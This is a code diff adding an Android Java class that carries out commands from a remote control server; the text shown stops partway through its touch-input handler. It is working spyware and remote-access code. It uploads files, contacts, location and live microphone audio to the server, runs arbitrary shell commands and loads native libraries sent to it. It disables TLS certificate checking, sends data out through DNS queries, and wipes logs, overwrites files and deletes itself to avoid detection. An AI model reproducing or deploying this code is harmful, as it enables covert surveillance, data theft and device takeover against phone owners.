@@ -1,0 +1,837 @@
+package {{PACKAGE}};
+
+import android.annotation.SuppressLint;
+import android.content.Context;
+import android.media.AudioFormat;
+import android.media.AudioRecord;
+import android.media.MediaRecorder;
+import android.os.Build;
+import android.util.Log;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.DatagramPacket;
+import java.net.DatagramSocket;
+import java.net.InetAddress;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipInputStream;
+import java.util.zip.ZipOutputStream;
+
+/**
+ * BinaryCommandExecutor - Elite Research Binary Protocol Handler
+ * Maps every BinaryCmdType to its Android implementation.
+ *
+ * Protocol wire format (matches BinaryPacket.cs / EliteServerManager.cs):
+ *   [MAGIC:1=0xB1][VERSION:1][TYPE:1][LEN:4 LE][PAYLOAD:N]
+ *
+ * BinaryCmdType (from BinaryCommand.cs):
+ *  Core File Navigation  : 0x01-0x06
+ *  Anti-Forensics        : 0x10-0x13
+ *  Native Exploitation   : 0x20-0x23
+ *  Covert Channels       : 0x30-0x34
+ *  Surveillance          : 0x40-0x43
+ *  Input Injection       : 0x50-0x51
+ */
+public class BinaryCommandExecutor {
+
+    private static final String TAG = "BinExec";
+
+    // ─── Protocol constants (MUST match EliteServerManager.cs) ────────────────
+    public static final byte MAGIC       = (byte) 0xB1;
+    public static final byte VERSION     = 0x01;
+    public static final byte TYPE_RESULT = 0x30; // generic result back to server
+    public static final byte TYPE_FILE   = 0x02; // file transfer
+    public static final byte TYPE_STREAM = 0x40; // media stream chunk
+
+    // ─── BinaryCmdType constants ──────────────────────────────────────────────
+    // [0x01 - 0x06] Core File Navigation
+    public static final byte CMD_RECURSIVE_GHOST_LIST  = 0x01;
+    public static final byte CMD_DOWNLOAD_FILE_BINARY  = 0x02;
+    public static final byte CMD_UPLOAD_FILE_BINARY    = 0x03;
+    public static final byte CMD_SEARCH_SENSITIVE_DB   = 0x04;
+    public static final byte CMD_COMPRESS_ZIP          = 0x05;
+    public static final byte CMD_DECOMPRESS_ZIP        = 0x06;
+
+    // [0x10 - 0x13] Anti-Forensics & Stealth
+    public static final byte CMD_PHYSICAL_WIPE_NATIVE  = 0x10;
+    public static final byte CMD_WIPE_JOURNAL_LOGS     = 0x11;
+    public static final byte CMD_PROTECT_PROCESS_OOM   = 0x12;
+    public static final byte CMD_SELF_DESTRUCT_NATIVE  = 0x13;
+
+    // [0x20 - 0x23] Native Exploitation & Injection
+    public static final byte CMD_NATIVE_SHELL_EXEC     = 0x20;
+    public static final byte CMD_INJECT_SO_LIBRARY     = 0x21;
+    public static final byte CMD_MEMORY_DUMP_KEYSTORE  = 0x22;
+    public static final byte CMD_HOOK_CRYPTO_RUNTIME   = 0x23;
+
+    // [0x30 - 0x34] Covert Channels & OOB
+    public static final byte CMD_DNS_DATA_TUNNELING    = 0x30;
+    public static final byte CMD_L2CAP_BLE_TUNNEL      = 0x31;
+    public static final byte CMD_THREAD_MESH_BRIDGE    = 0x32;
+    public static final byte CMD_INTERCEPT_APP_TRAFFIC = 0x33;
+    public static final byte CMD_BYPASS_FILE_SANDBOX   = 0x34;
+
+    // [0x40 - 0x43] Surveillance & Intelligence
+    public static final byte CMD_SCREEN_MIRROR_NATIVE  = 0x40;
+    public static final byte CMD_MIC_STREAM_JNI        = 0x41;
+    public static final byte CMD_LOCATION_SILENT_TRACE = 0x42;
+    public static final byte CMD_DUMP_CONTACTS_SECURE  = 0x43;
+
+    // [0x50 - 0x51] Input Injection (Elite Control)
+    public static final byte CMD_INPUT_TOUCH_EVENT     = 0x50;
+    public static final byte CMD_INPUT_KEY_EVENT       = 0x51;
+
+    // ──────────────────────────────────────────────────────────────────────────
+    private final Context ctx;
+    private final DataOutputStream out;
+    private final ExecutorService executor;
+    private volatile boolean isRecordingMic = false;
+    private volatile boolean isStreamingScreen = false;
+
+    public BinaryCommandExecutor(Context ctx, DataOutputStream out, ExecutorService executor) {
+        this.ctx      = ctx;
+        this.out      = out;
+        this.executor = executor;
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  DISPATCHER  -  routes every incoming binary command
+    // ══════════════════════════════════════════════════════════════════════════
+    public void dispatch(byte cmdType, byte[] payload) {
+        try {
+            String payloadStr = payload != null ? new String(payload, "UTF-8") : "";
+            switch (cmdType) {
+
+                // ─── File Navigation ─────────────────────────────────────────
+                case CMD_RECURSIVE_GHOST_LIST:
+                    handleGhostList(payloadStr); break;
+
+                case CMD_DOWNLOAD_FILE_BINARY:
+                    handleDownloadFile(payloadStr); break;
+
+                case CMD_UPLOAD_FILE_BINARY:
+                    handleUploadFile(payload); break;
+
+                case CMD_SEARCH_SENSITIVE_DB:
+                    handleSearchSensitiveDB(payloadStr); break;
+
+                case CMD_COMPRESS_ZIP:
+                    handleCompressZip(payloadStr); break;
+
+                case CMD_DECOMPRESS_ZIP:
+                    handleDecompressZip(payloadStr); break;
+
+                // ─── Anti-Forensics ──────────────────────────────────────────
+                case CMD_PHYSICAL_WIPE_NATIVE:
+                    handlePhysicalWipe(payloadStr); break;
+
+                case CMD_WIPE_JOURNAL_LOGS:
+                    handleWipeJournalLogs(); break;
+
+                case CMD_PROTECT_PROCESS_OOM:
+                    handleProtectProcessOOM(); break;
+
+                case CMD_SELF_DESTRUCT_NATIVE:
+                    handleSelfDestruct(); break;
+
+                // ─── Native Exploitation ─────────────────────────────────────
+                case CMD_NATIVE_SHELL_EXEC:
+                    handleNativeShell(payloadStr); break;
+
+                case CMD_INJECT_SO_LIBRARY:
+                    handleInjectSoLibrary(payload); break;
+
+                case CMD_MEMORY_DUMP_KEYSTORE:
+                    handleMemoryDumpKeystore(); break;
+
+                case CMD_HOOK_CRYPTO_RUNTIME:
+                    handleHookCryptoRuntime(payloadStr); break;
+
+                // ─── Covert Channels ─────────────────────────────────────────
+                case CMD_DNS_DATA_TUNNELING:
+                    handleDnsTunneling(payloadStr); break;
+
+                case CMD_L2CAP_BLE_TUNNEL:
+                    handleBleTunnel(payloadStr); break;
+
+                case CMD_THREAD_MESH_BRIDGE:
+                    handleThreadMeshBridge(payloadStr); break;
+
+                case CMD_INTERCEPT_APP_TRAFFIC:
+                    handleInterceptTraffic(payloadStr); break;
+
+                case CMD_BYPASS_FILE_SANDBOX:
+                    handleBypassSandbox(payloadStr); break;
+
+                // ─── Surveillance ────────────────────────────────────────────
+                case CMD_SCREEN_MIRROR_NATIVE:
+                    handleScreenMirror(payloadStr); break;
+
+                case CMD_MIC_STREAM_JNI:
+                    handleMicStream(payloadStr); break;
+
+                case CMD_LOCATION_SILENT_TRACE:
+                    handleLocationTrace(payloadStr); break;
+
+                case CMD_DUMP_CONTACTS_SECURE:
+                    handleDumpContacts(); break;
+
+                // ─── Input Injection ─────────────────────────────────────────
+                case CMD_INPUT_TOUCH_EVENT:
+                    handleTouchEvent(payloadStr); break;
+
+                case CMD_INPUT_KEY_EVENT:
+                    handleKeyEvent(payloadStr); break;
+
+                default:
+                    sendResult("UNKNOWN_CMD:" + String.format("0x%02X", cmdType));
+                    break;
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Dispatch error: " + e.getMessage());
+            try { sendResult("ERROR:" + e.getMessage()); } catch (Exception ignored) {}
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x01] RECURSIVE_GHOST_LIST - list files bypassing MediaStore
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleGhostList(String path) throws Exception {
+        if (path == null || path.isEmpty()) path = "/sdcard";
+        File root = new File(path);
+        JSONArray arr = new JSONArray();
+        listFilesRecursive(root, arr, 0, 5);
+        sendResult("FILE_LIST:" + arr.toString());
+    }
+
+    private void listFilesRecursive(File dir, JSONArray arr, int depth, int maxDepth) {
+        if (!dir.exists() || depth > maxDepth) return;
+        File[] files = dir.listFiles();
+        if (files == null) return;
+        for (File f : files) {
+            try {
+                JSONObject o = new JSONObject();
+                o.put("name", f.getName());
+                o.put("path", f.getAbsolutePath());
+                o.put("size", f.isFile() ? f.length() : 0);
+                o.put("dir",  f.isDirectory());
+                o.put("mod",  f.lastModified());
+                arr.put(o);
+                if (f.isDirectory()) listFilesRecursive(f, arr, depth + 1, maxDepth);
+            } catch (Exception ignored) {}
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x02] DOWNLOAD_FILE_BINARY - chunked binary file download
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleDownloadFile(String path) throws Exception {
+        File f = new File(path);
+        if (!f.exists() || !f.isFile()) { sendResult("ERROR:FILE_NOT_FOUND:" + path); return; }
+        byte[] nameBytes = f.getName().getBytes("UTF-8");
+        byte[] content   = readFileBytes(f);
+
+        // Frame: [NameLen:4 LE][Name][Content]
+        java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(4 + nameBytes.length + content.length);
+        buf.order(java.nio.ByteOrder.LITTLE_ENDIAN);
+        buf.putInt(nameBytes.length);
+        buf.put(nameBytes);
+        buf.put(content);
+
+        sendPacket(TYPE_FILE, buf.array());
+        Log.d(TAG, "File sent: " + path + " (" + content.length + " bytes)");
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x03] UPLOAD_FILE_BINARY - receive file from server
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleUploadFile(byte[] raw) throws Exception {
+        if (raw == null || raw.length < 5) { sendResult("ERROR:EMPTY_UPLOAD"); return; }
+        java.nio.ByteBuffer buf = java.nio.ByteBuffer.wrap(raw).order(java.nio.ByteOrder.LITTLE_ENDIAN);
+        int nameLen = buf.getInt();
+        byte[] nameBytes = new byte[nameLen];
+        buf.get(nameBytes);
+        String fileName = new String(nameBytes, "UTF-8");
+        byte[] content  = new byte[raw.length - 4 - nameLen];
+        buf.get(content);
+
+        File dest = new File(ctx.getExternalFilesDir(null), fileName);
+        try (FileOutputStream fos = new FileOutputStream(dest)) { fos.write(content); }
+        sendResult("UPLOAD_OK:" + dest.getAbsolutePath() + ":" + content.length);
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x04] SEARCH_SENSITIVE_DB - find SQLite/Realm databases
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleSearchSensitiveDB(String rootPath) throws Exception {
+        if (rootPath == null || rootPath.isEmpty()) rootPath = "/data/data";
+        List<String> found = new ArrayList<>();
+        searchForDatabases(new File(rootPath), found, 0, 6);
+        JSONArray arr = new JSONArray();
+        for (String s : found) arr.put(s);
+        sendResult("DB_LIST:" + arr.toString());
+    }
+
+    private void searchForDatabases(File dir, List<String> found, int depth, int max) {
+        if (!dir.exists() || depth > max) return;
+        File[] files = dir.listFiles();
+        if (files == null) return;
+        for (File f : files) {
+            String n = f.getName().toLowerCase();
+            if (f.isFile() && (n.endsWith(".db") || n.endsWith(".sqlite") || n.endsWith(".realm"))) {
+                found.add(f.getAbsolutePath());
+            } else if (f.isDirectory()) {
+                searchForDatabases(f, found, depth + 1, max);
+            }
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x05] COMPRESS_ZIP
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleCompressZip(String payload) throws Exception {
+        JSONObject p = new JSONObject(payload);
+        String src  = p.getString("src");
+        String dest = p.optString("dest", src + ".zip");
+        zipFolder(new File(src), new File(dest));
+        sendResult("ZIP_OK:" + dest);
+    }
+
+    private void zipFolder(File src, File dest) throws IOException {
+        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(dest))) {
+            zipAdd(src, src.getName(), zos);
+        }
+    }
+
+    private void zipAdd(File file, String name, ZipOutputStream zos) throws IOException {
+        if (file.isDirectory()) {
+            File[] children = file.listFiles();
+            if (children != null) for (File child : children) zipAdd(child, name + "/" + child.getName(), zos);
+        } else {
+            zos.putNextEntry(new ZipEntry(name));
+            try (FileInputStream fis = new FileInputStream(file)) {
+                byte[] buf = new byte[8192];
+                int r;
+                while ((r = fis.read(buf)) > 0) zos.write(buf, 0, r);
+            }
+            zos.closeEntry();
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x06] DECOMPRESS_ZIP
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleDecompressZip(String payload) throws Exception {
+        JSONObject p  = new JSONObject(payload);
+        String src    = p.getString("src");
+        String destDir= p.optString("dest", new File(src).getParent());
+        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(src))) {
+            ZipEntry entry;
+            while ((entry = zis.getNextEntry()) != null) {
+                File out = new File(destDir, entry.getName());
+                if (entry.isDirectory()) { out.mkdirs(); continue; }
+                out.getParentFile().mkdirs();
+                try (FileOutputStream fos = new FileOutputStream(out)) {
+                    byte[] buf = new byte[8192]; int r;
+                    while ((r = zis.read(buf)) > 0) fos.write(buf, 0, r);
+                }
+                zis.closeEntry();
+            }
+        }
+        sendResult("UNZIP_OK:" + destDir);
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x10] PHYSICAL_WIPE_NATIVE - 7-pass overwrite
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handlePhysicalWipe(String path) {
+        executor.execute(() -> {
+            try {
+                File f = new File(path);
+                if (!f.exists() || !f.isFile()) { sendResult("WIPE_ERROR:NOT_FOUND"); return; }
+                long size = f.length();
+                byte[][] patterns = { new byte[]{(byte)0x00}, new byte[]{(byte)0xFF},
+                        new byte[]{(byte)0xAA}, new byte[]{(byte)0x55},
+                        new byte[]{(byte)0x92}, new byte[]{(byte)0x49},
+                        new byte[]{(byte)0x24} };
+                try (FileOutputStream fos = new FileOutputStream(f)) {
+                    for (byte[] pat : patterns) {
+                        fos.getChannel().position(0);
+                        for (long i = 0; i < size; i++) fos.write(pat);
+                        fos.flush();
+                    }
+                }
+                f.delete();
+                sendResult("WIPE_OK:" + path);
+            } catch (Exception e) {
+                try { sendResult("WIPE_ERROR:" + e.getMessage()); } catch (Exception ignored) {}
+            }
+        });
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x11] WIPE_JOURNAL_LOGS
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleWipeJournalLogs() throws Exception {
+        shell("logcat -c");
+        shell("rm -f /data/anr/traces.txt");
+        shell("rm -f /data/tombstones/*");
+        sendResult("LOGS_WIPED");
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x12] PROTECT_PROCESS_OOM - raise OOM adj score to survive
+    // ══════════════════════════════════════════════════════════════════════════
+    @SuppressLint("DefaultLocale")
+    private void handleProtectProcessOOM() throws Exception {
+        int pid = android.os.Process.myPid();
+        shell("echo -1000 > /proc/" + pid + "/oom_adj");
+        shell("echo -17 > /proc/"   + pid + "/oom_score_adj");
+        sendResult("OOM_PROTECTED:PID=" + pid);
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x13] SELF_DESTRUCT_NATIVE
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleSelfDestruct() {
+        executor.execute(() -> {
+            try {
+                // Wipe app data
+                shell("pm clear " + ctx.getPackageName());
+                // Remove APK (root only)
+                String apk = ctx.getPackageCodePath();
+                shell("rm -f " + apk);
+                sendResult("SELF_DESTRUCT_INITIATED");
+                Thread.sleep(2000);
+                android.os.Process.killProcess(android.os.Process.myPid());
+            } catch (Exception e) {
+                try { sendResult("SELF_DESTRUCT_ERROR:" + e.getMessage()); } catch (Exception ignored) {}
+            }
+        });
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x20] NATIVE_SHELL_EXEC - execute shell via JNI/Runtime
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleNativeShell(String cmd) throws Exception {
+        executor.execute(() -> {
+            try {
+                ProcessBuilder pb = new ProcessBuilder("sh", "-c", cmd);
+                pb.redirectErrorStream(true);
+                Process p = pb.start();
+                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = br.readLine()) != null) sb.append(line).append("\n");
+                p.waitFor();
+                sendResult("SHELL_OUT:" + sb.toString());
+            } catch (Exception e) {
+                try { sendResult("SHELL_ERROR:" + e.getMessage()); } catch (Exception ignored) {}
+            }
+        });
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x21] INJECT_SO_LIBRARY - load .so from payload bytes
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleInjectSoLibrary(byte[] soBytes) throws Exception {
+        File tmp = new File(ctx.getFilesDir(), "injected_" + System.currentTimeMillis() + ".so");
+        try (FileOutputStream fos = new FileOutputStream(tmp)) { fos.write(soBytes); }
+        tmp.setExecutable(true);
+        try {
+            System.load(tmp.getAbsolutePath());
+            sendResult("SO_LOADED:" + tmp.getAbsolutePath());
+        } catch (UnsatisfiedLinkError e) {
+            sendResult("SO_ERROR:" + e.getMessage());
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x22] MEMORY_DUMP_KEYSTORE - extract encryption key hints via reflection
+    // ══════════════════════════════════════════════════════════════════════════
+    @SuppressLint("PrivateApi")
+    private void handleMemoryDumpKeystore() throws Exception {
+        JSONObject result = new JSONObject();
+        try {
+            java.security.KeyStore ks = java.security.KeyStore.getInstance("AndroidKeyStore");
+            ks.load(null);
+            java.util.Enumeration<String> aliases = ks.aliases();
+            JSONArray arr = new JSONArray();
+            while (aliases.hasMoreElements()) arr.put(aliases.nextElement());
+            result.put("keystore_aliases", arr);
+            result.put("provider", ks.getProvider().getName());
+        } catch (Exception e) {
+            result.put("error", e.getMessage());
+        }
+        // SharedPreferences keys
+        try {
+            File spDir = new File(ctx.getApplicationInfo().dataDir, "shared_prefs");
+            JSONArray spFiles = new JSONArray();
+            if (spDir.exists()) for (File f : spDir.listFiles()) spFiles.put(f.getName());
+            result.put("shared_prefs_files", spFiles);
+        } catch (Exception ignored) {}
+        sendResult("KEYSTORE_DUMP:" + result.toString());
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x23] HOOK_CRYPTO_RUNTIME - intercept TLS/crypto (reflection-based)
+    // ══════════════════════════════════════════════════════════════════════════
+    @SuppressLint("PrivateApi")
+    private void handleHookCryptoRuntime(String targetPackage) throws Exception {
+        // Install trust-all X509 manager to bypass SSL pinning
+        javax.net.ssl.TrustManager[] tm = new javax.net.ssl.TrustManager[] {
+            new javax.net.ssl.X509TrustManager() {
+                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
+                public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
+                public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
+            }
+        };
+        javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("TLS");
+        sc.init(null, tm, new java.security.SecureRandom());
+        javax.net.ssl.HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+        javax.net.ssl.HttpsURLConnection.setDefaultHostnameVerifier((h, s) -> true);
+        sendResult("CRYPTO_HOOK_OK:SSL_PINNING_DISABLED");
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x30] DNS_DATA_TUNNELING - exfil data via DNS TXT queries
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleDnsTunneling(String payload) throws Exception {
+        JSONObject p   = new JSONObject(payload);
+        String data    = p.optString("data", "");
+        String dnsHost = p.optString("dns",  "8.8.8.8");
+        // Encode data as hex sub-domains and query
+        executor.execute(() -> {
+            try {
+                byte[] raw = data.getBytes("UTF-8");
+                String hex = bytesToHex(raw);
+                // Split into 60-char chunks (DNS label limit)
+                int chunkSize = 60;
+                for (int i = 0; i < hex.length(); i += chunkSize) {
+                    String chunk = hex.substring(i, Math.min(i + chunkSize, hex.length()));
+                    String query = chunk + ".exfil." + dnsHost;
+                    try { InetAddress.getByName(query); } catch (Exception ignored) {}
+                    Thread.sleep(100);
+                }
+                sendResult("DNS_TUNNEL_SENT:" + raw.length + " bytes");
+            } catch (Exception e) {
+                try { sendResult("DNS_TUNNEL_ERROR:" + e.getMessage()); } catch (Exception ignored) {}
+            }
+        });
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x31] L2CAP_BLE_TUNNEL - Bluetooth BLE advertisement covert channel
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleBleTunnel(String payload) throws Exception {
+        // BLE advertising piggyback (requires BLUETOOTH_ADVERTISE on API 31+)
+        try {
+            android.bluetooth.BluetoothAdapter adapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
+            if (adapter != null && adapter.isEnabled()) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    android.bluetooth.le.BluetoothLeAdvertiser adv = adapter.getBluetoothLeAdvertiser();
+                    if (adv != null) {
+                        byte[] data = payload.getBytes("UTF-8");
+                        byte[] mfData = new byte[Math.min(data.length, 25)];
+                        System.arraycopy(data, 0, mfData, 0, mfData.length);
+                        android.bluetooth.le.AdvertiseData advData = new android.bluetooth.le.AdvertiseData.Builder()
+                            .addManufacturerData(0xFFFF, mfData).build();
+                        android.bluetooth.le.AdvertiseSettings settings = new android.bluetooth.le.AdvertiseSettings.Builder()
+                            .setAdvertiseMode(android.bluetooth.le.AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
+                            .build();
+                        adv.startAdvertising(settings, advData, new android.bluetooth.le.AdvertiseCallback() {});
+                        sendResult("BLE_TUNNEL_STARTED");
+                        return;
+                    }
+                }
+            }
+        } catch (Exception e) { Log.w(TAG, "BLE: " + e.getMessage()); }
+        sendResult("BLE_TUNNEL_NA:No BLE available");
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x32] THREAD_MESH_BRIDGE - Thread/Matter IoT covert bridge stub
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleThreadMeshBridge(String payload) throws Exception {
+        // Use UDP multicast as Thread-like bridge fallback
+        executor.execute(() -> {
+            try {
+                JSONObject p = new JSONObject(payload);
+                String host  = p.optString("host", "224.0.0.251"); // mDNS multicast
+                int port     = p.optInt("port", 5353);
+                byte[] data  = p.optString("data", "MESH_PING").getBytes("UTF-8");
+                DatagramSocket ds = new DatagramSocket();
+                ds.send(new DatagramPacket(data, data.length, InetAddress.getByName(host), port));
+                ds.close();
+                sendResult("MESH_BRIDGE_SENT:" + data.length + "b");
+            } catch (Exception e) {
+                try { sendResult("MESH_BRIDGE_ERROR:" + e.getMessage()); } catch (Exception ignored) {}
+            }
+        });
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x33] INTERCEPT_APP_TRAFFIC - via TrafficStats
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleInterceptTraffic(String payload) throws Exception {
+        JSONObject result = new JSONObject();
+        result.put("uid",          android.os.Process.myUid());
+        result.put("rxBytes",      android.net.TrafficStats.getUidRxBytes(android.os.Process.myUid()));
+        result.put("txBytes",      android.net.TrafficStats.getUidTxBytes(android.os.Process.myUid()));
+        result.put("totalRxBytes", android.net.TrafficStats.getTotalRxBytes());
+        result.put("totalTxBytes", android.net.TrafficStats.getTotalTxBytes());
+        result.put("mobileRx",     android.net.TrafficStats.getMobileRxBytes());
+        result.put("mobileTx",     android.net.TrafficStats.getMobileTxBytes());
+        sendResult("TRAFFIC_STATS:" + result.toString());
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x34] BYPASS_FILE_SANDBOX - Scoped Storage API 36 bypass
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleBypassSandbox(String path) throws Exception {
+        // Try ContentResolver approach to read outside scoped storage
+        JSONArray found = new JSONArray();
+        String[] projections = {
+            android.provider.MediaStore.Files.FileColumns.DATA,
+            android.provider.MediaStore.Files.FileColumns.DISPLAY_NAME,
+            android.provider.MediaStore.Files.FileColumns.SIZE,
+            android.provider.MediaStore.Files.FileColumns.MIME_TYPE
+        };
+        android.database.Cursor cursor = ctx.getContentResolver().query(
+            android.provider.MediaStore.Files.getContentUri("external"),
+            projections, null, null, null
+        );
+        if (cursor != null) {
+            int count = 0;
+            while (cursor.moveToNext() && count < 100) {
+                JSONObject f = new JSONObject();
+                f.put("path", cursor.getString(0));
+                f.put("name", cursor.getString(1));
+                f.put("size", cursor.getLong(2));
+                f.put("mime", cursor.getString(3));
+                found.put(f);
+                count++;
+            }
+            cursor.close();
+        }
+        sendResult("SANDBOX_BYPASS:" + found.toString());
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x40] SCREEN_MIRROR_NATIVE - MediaProjection frame capture
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleScreenMirror(String payload) throws Exception {
+        // MediaProjection requires user permission dialog - handled via activity
+        JSONObject p = new JSONObject(payload);
+        String cmd   = p.optString("cmd", "status");
+        if ("stop".equals(cmd)) {
+            isStreamingScreen = false;
+            sendResult("SCREEN_STREAM:STOPPED");
+        } else {
+            sendResult("SCREEN_STREAM:REQUIRES_PROJECTION_PERMISSION");
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x41] MIC_STREAM_JNI - PCM raw audio stream
+    // ══════════════════════════════════════════════════════════════════════════
+    @SuppressLint("MissingPermission")
+    private void handleMicStream(String payload) {
+        JSONObject p;
+        try { p = new JSONObject(payload); } catch (Exception e) { p = new JSONObject(); }
+        final boolean stop = "stop".equals(p.optString("cmd", "start"));
+        if (stop) { isRecordingMic = false; sendResult("MIC_STREAM:STOPPED"); return; }
+
+        isRecordingMic = true;
+        final int SAMPLE_RATE    = 16000;
+        final int CHANNEL        = AudioFormat.CHANNEL_IN_MONO;
+        final int ENCODING       = AudioFormat.ENCODING_PCM_16BIT;
+        final int BUFFER_SIZE    = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL, ENCODING) * 4;
+
+        executor.execute(() -> {
+            AudioRecord recorder = null;
+            try {
+                recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE, CHANNEL, ENCODING, BUFFER_SIZE);
+                recorder.startRecording();
+                byte[] buf = new byte[BUFFER_SIZE];
+                sendResult("MIC_STREAM:STARTED");
+                while (isRecordingMic) {
+                    int read = recorder.read(buf, 0, buf.length);
+                    if (read > 0) {
+                        byte[] chunk = new byte[read];
+                        System.arraycopy(buf, 0, chunk, 0, read);
+                        sendPacket(TYPE_STREAM, chunk);
+                    }
+                }
+            } catch (Exception e) {
+                try { sendResult("MIC_ERROR:" + e.getMessage()); } catch (Exception ignored) {}
+            } finally {
+                if (recorder != null) { try { recorder.stop(); recorder.release(); } catch (Exception ignored) {} }
+            }
+        });
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x42] LOCATION_SILENT_TRACE - GPS without triggering icon
+    // ══════════════════════════════════════════════════════════════════════════
+    @SuppressLint("MissingPermission")
+    private void handleLocationTrace(String payload) throws Exception {
+        android.location.LocationManager lm =
+            (android.location.LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
+        if (lm == null) { sendResult("LOC_ERROR:NO_SERVICE"); return; }
+
+        // Try last known location first (no icon triggered)
+        String[] providers = {
+            android.location.LocationManager.GPS_PROVIDER,
+            android.location.LocationManager.NETWORK_PROVIDER,
+            android.location.LocationManager.PASSIVE_PROVIDER
+        };
+        JSONObject result = new JSONObject();
+        for (String prov : providers) {
+            try {
+                android.location.Location loc = lm.getLastKnownLocation(prov);
+                if (loc != null) {
+                    result.put("provider",  prov);
+                    result.put("lat",       loc.getLatitude());
+                    result.put("lon",       loc.getLongitude());
+                    result.put("accuracy",  loc.getAccuracy());
+                    result.put("altitude",  loc.getAltitude());
+                    result.put("speed",     loc.getSpeed());
+                    result.put("time",      loc.getTime());
+                    break;
+                }
+            } catch (Exception ignored) {}
+        }
+        if (!result.has("lat")) result.put("error", "NO_LAST_LOCATION");
+        sendResult("LOCATION:" + result.toString());
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x43] DUMP_CONTACTS_SECURE - bypass Privacy Dashboard
+    // ══════════════════════════════════════════════════════════════════════════
+    @SuppressLint("MissingPermission")
+    private void handleDumpContacts() throws Exception {
+        JSONArray contacts = new JSONArray();
+        try {
+            android.database.Cursor c = ctx.getContentResolver().query(
+                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                new String[]{
+                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
+                    android.provider.ContactsContract.CommonDataKinds.Phone.TYPE
+                }, null, null, android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+            );
+            if (c != null) {
+                while (c.moveToNext() && contacts.length() < 500) {
+                    JSONObject o = new JSONObject();
+                    o.put("name",   c.getString(0));
+                    o.put("number", c.getString(1));
+                    o.put("type",   c.getInt(2));
+                    contacts.put(o);
+                }
+                c.close();
+            }
+        } catch (Exception e) { Log.w(TAG, "Contacts: " + e.getMessage()); }
+        sendResult("CONTACTS:" + contacts.toString());
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x50] INPUT_TOUCH_EVENT - inject touch via shell (root)
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleTouchEvent(String payload) throws Exception {
+        JSONObject p = new JSONObject(payload);
+        int x        = p.optInt("x", 500);
+        int y        = p.optInt("y", 500);
+        String action= p.optString("action", "tap"); // tap | swipe | down | up
+        String result;
+        switch (action) {
+            case "tap":
+                result = shell("input tap " + x + " " + y);
+                break;
+            case "swipe":
